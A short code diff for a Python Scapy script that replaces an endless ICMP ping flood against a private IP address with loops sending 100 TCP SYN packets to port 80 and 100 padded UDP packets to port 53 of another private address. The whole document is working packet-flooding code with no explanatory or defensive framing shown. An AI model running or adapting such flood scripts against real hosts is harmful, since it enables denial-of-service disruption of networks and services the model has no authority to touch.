@@ -1,11 +1,11 @@
 from scapy.all import *
-import time
 
-target_ip = "192.168.18.3"
+target_ip = "192.168.1.1"
+target_port = 80
 
-def ping_flood():
-    while True:
-        packet = IP(dst=target_ip) / ICMP()
-        send(packet, verbose=False)
-
-ping_flood()
+for i in range(100):
+    packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
+    send(packet, verbose=False)
+for i in range(100):
+    packet = IP(dst=target_ip) / UDP(dport=53) / Raw(load="A"*100)
+    send(packet, verbose=False)
